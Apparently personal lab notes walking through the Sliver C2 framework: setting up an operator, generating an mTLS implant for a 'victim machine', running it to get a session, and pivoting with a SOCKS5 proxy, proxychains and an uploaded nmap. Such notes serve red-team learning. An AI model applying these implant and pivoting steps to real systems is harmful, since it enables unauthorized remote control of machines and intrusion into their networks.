./sliver-server linux to start
  
```Markdown
new-operator --name <name> --lhost localhost
```
- name could just be the name of the machine
![[assets/Sliver/image 62.png|image 62.png]]
- creates a config file
  
multiplayer
![[assets/Sliver/image 1 31.png|image 1 31.png]]
  
using config file from earlier, run
```Markdown
./sliver-client import <name_of_config_file>
```
- choose computer
![[assets/Sliver/image 2 31.png|image 2 31.png]]
  
should get a confirmation that the system has joined
![[assets/Sliver/image 3 26.png|image 3 26.png]]
  
in the silver client window, type the following to create a binary for victim machine to connect
```Markdown
generate --mtls <IP> --os <operating_system> --arch <architecture> --skip-symbols --save <save_location> --name <name>
```
![[assets/Sliver/image 4 23.png|image 4 23.png]]
  
transfer the file created over to the victim machine
- in this example, it’s “heron_linyt”
![[assets/Sliver/image 5 22.png|image 5 22.png]]
  
chmod 777 <file_name>
![[assets/Sliver/image 6 18.png|image 6 18.png]]
  
  
go back to sliver window and type “mtls” to start listener
![[assets/Sliver/image 7 17.png|image 7 17.png]]
  
  
```Markdown
./<file_name
```
![[assets/Sliver/image 8 15.png|image 8 15.png]]
  
  
type “use <code>”
- code is shown from the output “session <code_head> started…”
- so maybe just type the beginning then tab?
- example of head in this is “35d2fe25”
![[assets/Sliver/image 9 15.png|image 9 15.png]]
  
change proxychains config to
- socks5 127.0.0.1 1081
![[assets/Sliver/image 10 11.png|image 10 11.png]]
  
type “socks5 start” in the rev shell
![[assets/Sliver/image 11 11.png|image 11 11.png]]
- can now run proxychains since sliver does a tunnel for you
![[assets/Sliver/image 12 8.png|image 12 8.png]]
  
doing nmap through proxychains is really slow, but in sliver’s C2, you can use the “upload command”
- upload nmap
![[assets/Sliver/image 13 8.png|image 13 8.png]]
- nmap was in his current directory
  
![[assets/Sliver/image 14 8.png|image 14 8.png]]
  
using proxychains with sliver
- just set the port to 1081 and use SOCKS5
![[assets/Sliver/image 15 7.png|image 15 7.png]]